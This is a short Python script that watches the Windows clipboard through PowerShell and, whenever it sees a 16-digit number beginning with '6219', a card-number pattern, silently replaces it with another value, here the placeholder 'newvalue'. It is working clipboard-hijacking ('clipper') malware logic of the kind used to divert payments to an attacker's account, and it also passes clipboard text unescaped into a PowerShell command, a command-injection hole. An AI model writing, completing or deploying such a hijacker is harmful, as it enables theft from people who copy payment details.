import subprocess
import time

def get_clipboard():
    result = subprocess.run(
        ["powershell", "-NoProfile", "-command", "Get-Clipboard"],
        capture_output=True,
        text=True
    )
    return result.stdout.strip()

def set_clipboard(text):
    subprocess.run(
        ["powershell", "-NoProfile", "-command", f"Set-Clipboard -Value '{text}'"],
        capture_output=True,
        text=True
    )

def main():
    last_seen = None
    while True:
        current = get_clipboard()

        if current != last_seen:
            last_seen = current

            if current.startswith("6219") and len(current) == 16:
                set_clipboard("newvalue")
                last_seen = "newvalue"
                print(f"[+] Clipboard changed: {current!r} -> 'newvalue'")
            else:
                print(f"[!] Failed to change clipboard for: {current!r}")

        time.sleep(0.5)

if __name__ == "__main__":
    # set_clipboard("hello")
    # c = get_clipboard()
    # print(c)
    main()